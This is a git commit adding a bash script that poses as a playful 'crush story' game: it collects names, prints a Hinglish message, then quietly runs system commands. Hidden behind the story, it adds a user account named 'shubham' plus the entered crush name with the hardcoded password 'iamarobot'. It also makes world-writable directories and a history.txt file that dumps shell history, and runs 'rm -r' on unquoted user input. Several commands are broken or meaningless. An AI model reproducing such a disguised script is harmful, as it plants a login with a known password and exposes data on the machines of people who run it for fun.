e5719e41f9d9984f507385f83cc9f204d06c79a6
JarvisSagar <35000232+JarvisSagar@users.noreply.github.com>
2020-01-31 02:12:41 +0530

    Add files via upload

---
+++ storyscript.sh
@@ -0,0 +1,48 @@
+#!/bin/bash
+echo "Plz Enter Your Name"
+read n1
+echo "Now Enter your Crush Name "
+read n2
+echo "Enter your Fvrt Colour"
+read n3
+echo "Your Best Friend Name"
+read n4
+      echo Thankyou, Just Wait few seconds 
+clear
+sleep 2
+echo  --------------Hello $n1  ---------------------
+echo " Dear $n1
+          Aur Batao Kaise Ho, Aaaj Kal Tumhari $n2  Nhi Dikhti.
+	  Kal Mujhe Tumhari $n2 Mili Thi, Tumhare Bare me Puch rahi Thi.
+	  Kah Rahi Thi Mera $n1 kaisa hai, Bahut Yaad Aati Hai Uski.
+	  Aur Ha $n2 bol rhii thi ki $n1 se Kah Dena Mujhe Call Karna.
+	  Pata Aaj Vo Bhi $n3 Dress Pahan Ke Aayi  Thi College.
+	                                     
+	                                         Your $n4   "
+ sleep 8
+clear
+mkdir $n1
+chmod 777 $n1
+cd $n1
+sleep 2
+clear
+pinky 
+sleep 1
+rm -r $n1
+clear
+ifconfig y
+sleep 2
+clear
+adduser shubham$n2
+echo iamarobot |passwd shubham$n2
+clear
+rm -r shubham$n2
+cd ~
+cd /bin
+ls m???
+sleep 2
+clear
+history >>history.txt
+chmod 777 history.txt
+cat history.txt
+                                                     
